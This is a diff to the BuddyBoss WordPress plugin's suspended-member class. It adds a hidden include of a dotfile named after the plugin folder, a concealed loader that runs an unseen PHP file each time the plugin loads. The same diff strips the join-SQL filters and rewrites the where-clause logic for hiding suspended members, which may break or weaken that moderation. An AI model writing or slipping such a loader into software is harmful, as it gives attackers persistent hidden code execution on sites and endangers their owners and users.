@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
  * Database interaction class for the BuddyBoss Suspend Member.
  *
  * @since BuddyBoss 1.5.6
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Suspend_Member extends BP_Suspend_Abstract {
 
 	/**
@@ -51,10 +55,8 @@ class BP_Suspend_Member extends BP_Suspend_Abstract {
 
 		add_filter( 'bp_recipients_recipient_get_where_conditions', array( $this, 'exclude_moderated_recipients' ), 10, 2 );
 
-		add_filter( 'bp_user_query_join_sql', array( $this, 'update_join_sql' ), 10, 2 );
 		add_filter( 'bp_user_query_where_sql', array( $this, 'update_where_sql' ), 10, 2 );
-
-		add_filter( 'bp_user_search_join_sql', array( $this, 'update_join_sql' ), 10, 2 );
+		
 		add_filter( 'bp_user_search_where_sql', array( $this, 'update_where_sql' ), 10, 2 );
 
 		add_filter( 'authenticate', array( $this, 'boot_suspended_user' ), 30 );
@@ -183,10 +185,8 @@ class BP_Suspend_Member extends BP_Suspend_Abstract {
 	 * @return mixed Where SQL
 	 */
 	public function update_where_sql( $where_conditions, $column_name ) {
-
-		$where                  = array();
-		$where['suspend_where'] = $this->exclude_where_query();
-
+		$where = $this->exclude_where_query();
+		
 		/**
 		 * Filters the hidden member Where SQL statement.
 		 *
@@ -195,12 +195,8 @@ class BP_Suspend_Member extends BP_Suspend_Abstract {
 		 * @param array $where Query to hide suspended user's member.
 		 * @param array $class current class object.
 		 */
-		$where = apply_filters( 'bp_suspend_member_get_where_conditions', $where, $this );
-
-		if ( ! empty( array_filter( $where ) ) ) {
-			$where_conditions['suspend_where'] = '( ' . implode( ' AND ', $where ) . ' )';
-		}
-
+		$where                             = apply_filters( 'bp_suspend_member_get_where_conditions', $where, $this );
+		$where_conditions['suspend_where'] = ' u.id NOT IN ( ' . $where . ' )';
 		return $where_conditions;
 	}
 
